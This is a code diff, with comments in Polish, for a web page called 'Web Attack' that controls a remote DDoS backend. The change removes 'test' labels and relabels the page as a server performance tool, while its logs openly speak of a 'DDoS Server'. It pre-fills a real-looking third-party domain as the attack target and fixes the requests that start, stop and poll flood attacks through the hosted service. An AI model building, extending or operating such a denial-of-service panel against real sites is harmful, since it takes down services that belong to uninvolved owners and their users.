@@ -3,11 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Konsola - Web Attack (Test)</title>
+    <title>Konsola - Web Attack</title>
     <link rel="icon" href="https://github.com/M1DES1/social-tools/raw/refs/heads/main/cwel.ico" type="image/x-icon">
     <link rel="stylesheet" href="style.css">
     <style>
-        /* (style pozostawiam bez zmian, są poprawne) */
         .attack-container {
             max-width: 700px;
             margin: 30px auto;
@@ -233,8 +232,8 @@
 
     <div class="attack-container">
         <div class="attack-header">
-            <h2>⚔️ WEB ATTACK (TEST)</h2>
-            <p>Test połączenia z backendem Node.js</p>
+            <h2>⚔️ WEB ATTACK</h2>
+            <p>Narzędzie do testowania wydajności serwerów</p>
         </div>
         
         <div class="attack-body">
@@ -248,14 +247,14 @@
                 <label>🎯 CEL ATAKU (URL)</label>
                 <input type="text" id="targetUrl" class="attack-input" 
                        placeholder="https://example.com" 
-                       value="http://example.com">
+                       value="https://zdalne.szymaniuk.com">
             </div>
 
             <div class="input-group">
                 <label>⚡ ILOŚĆ WĄTKÓW (1-500)</label>
                 <div class="threads-control">
-                    <span id="threadsValue">100</span>
-                    <input type="range" id="threadsSlider" min="1" max="500" value="100" step="1">
+                    <span id="threadsValue">208</span>
+                    <input type="range" id="threadsSlider" min="1" max="500" value="208" step="1">
                 </div>
             </div>
 
@@ -301,7 +300,7 @@
     </div>
 
     <script>
-        // === KONFIGURACJA – TWOJ ADRES Z RENDER ===
+        // === KONFIGURACJA – ADRES SERWERA PYTHON ===
         const API_BASE_URL = 'https://social-tools-ddos.onrender.com';
         const API_URL = API_BASE_URL + '/api';
 
@@ -309,7 +308,7 @@
         let statusInterval = null;
         let attackStartTime = null;
 
-        // Sprawdzenie czy użytkownik jest zalogowany (działa z Twoim backendem)
+        // Sprawdzenie czy użytkownik jest zalogowany
         document.addEventListener('DOMContentLoaded', function() {
             const currentUser = localStorage.getItem('currentUser');
             const nav = document.getElementById('nav');
@@ -339,7 +338,6 @@
             const badge = document.getElementById('serverBadge');
             
             try {
-                // Próbujemy połączyć się z Twoim API
                 const response = await fetch(`${API_BASE_URL}`, {
                     method: 'GET',
                     headers: { 'Content-Type': 'application/json' }
@@ -348,15 +346,15 @@
                 if (response.ok) {
                     const data = await response.json();
                     badge.className = 'server-badge online';
-                    badge.innerHTML = `🟢 Serwer: Połączony (${data.message || 'OK'})`;
-                    addLog('✅ Połączono z serwerem backendu', 'success');
+                    badge.innerHTML = `🟢 Serwer: Połączony (${data.name || 'DDoS Server'})`;
+                    addLog('✅ Połączono z serwerem DDoS', 'success');
                 } else {
-                    throw new Error('Serwer nie odpowiada prawidłowo');
+                    throw new Error('Serwer nie odpowiada');
                 }
             } catch (error) {
                 badge.className = 'server-badge offline';
                 badge.innerHTML = '🔴 Serwer: Brak połączenia';
-                addLog('❌ Błąd połączenia z serwerem backendu', 'error');
+                addLog('❌ Błąd połączenia z serwerem DDoS', 'error');
             }
         }
 
@@ -380,19 +378,25 @@
             document.getElementById('startAttackBtn').disabled = true;
             document.getElementById('stopAttackBtn').disabled = false;
             
-            addLog(`🚀 Próba rozpoczęcia ataku na ${targetUrl} (${threads} wątków)...`, 'attack');
+            addLog(`🚀 Rozpoczynanie ataku na ${targetUrl} (${threads} wątków)...`, 'attack');
 
             try {
-                // UWAGA: Twój backend Node.js prawdopodobnie NIE MA tych endpointów
-                // To tylko test połączenia – dostaniesz błąd 404
+                // === POPRAWIONE: DODANY HEADER CONTENT-TYPE ===
                 const response = await fetch(`${API_URL}/attack/start`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 
+                        'Content-Type': 'application/json'  // TO JEST KLUCZOWE!
+                    },
                     body: JSON.stringify({
                         url: targetUrl,
                         threads: parseInt(threads)
                     })
                 });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`HTTP ${response.status}: ${errorText.substring(0, 100)}`);
+                }
 
                 const data = await response.json();
 
@@ -400,12 +404,14 @@
                     currentAttackId = data.attack_id;
                     attackStartTime = Date.now();
                     
+                    // Pokaż panel statusu
                     document.getElementById('statusPanel').style.display = 'block';
                     document.getElementById('attackId').textContent = data.attack_id;
                     document.getElementById('attackTarget').textContent = targetUrl;
                     
                     addLog(`✅ Atak rozpoczęty! ID: ${data.attack_id}`, 'success');
                     
+                    // Rozpocznij odświeżanie statusu
                     if (statusInterval) clearInterval(statusInterval);
                     statusInterval = setInterval(updateAttackStatus, 1000);
                 } else {
@@ -413,7 +419,7 @@
                     resetButtons();
                 }
             } catch (error) {
-                addLog(`❌ Błąd połączenia: ${error.message} – czy backend ma endpoint /api/attack/start?`, 'error');
+                addLog(`❌ Błąd połączenia: ${error.message}`, 'error');
                 resetButtons();
             }
         }
@@ -430,8 +436,14 @@
             try {
                 const response = await fetch(`${API_URL}/attack/stop/${currentAttackId}`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' }
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    }
                 });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
 
                 const data = await response.json();
 
@@ -444,6 +456,7 @@
                 addLog(`❌ Błąd: ${error.message}`, 'error');
             }
 
+            // Czyść interwał i resetuj
             if (statusInterval) {
                 clearInterval(statusInterval);
                 statusInterval = null;
@@ -458,7 +471,26 @@
             if (!currentAttackId) return;
 
             try {
-                const response = await fetch(`${API_URL}/attack/status/${currentAttackId}`);
+                const response = await fetch(`${API_URL}/attack/status/${currentAttackId}`, {
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    }
+                });
+                
+                if (!response.ok) {
+                    if (response.status === 404) {
+                        // Atak już nie istnieje - zatrzymaj odświeżanie
+                        if (statusInterval) {
+                            clearInterval(statusInterval);
+                            statusInterval = null;
+                        }
+                        addLog('⚠️ Atak zakończony (nie znaleziono)', 'warning');
+                        resetButtons();
+                        return;
+                    }
+                    throw new Error(`HTTP ${response.status}`);
+                }
+
                 const data = await response.json();
 
                 if (data.success) {
@@ -472,11 +504,16 @@
 
                     if (!data.active) {
                         addLog('⚠️ Atak zakończony', 'warning');
-                        stopAttack();
+                        if (statusInterval) {
+                            clearInterval(statusInterval);
+                            statusInterval = null;
+                        }
+                        resetButtons();
                     }
                 }
             } catch (error) {
                 console.error('Błąd aktualizacji statusu:', error);
+                // Nie zatrzymuj interwału przy błędzie sieciowym - spróbuj ponownie
             }
         }
 
@@ -503,8 +540,10 @@
             logEntry.innerHTML = `<span class="log-time">[${time}]</span> <span style="color: ${color}">${message}</span>`;
             logPanel.appendChild(logEntry);
             
+            // Przewiń na dół
             logPanel.scrollTop = logPanel.scrollHeight;
             
+            // Ogranicz ilość logów
             if (logPanel.children.length > 50) {
                 logPanel.removeChild(logPanel.children[0]);
             }
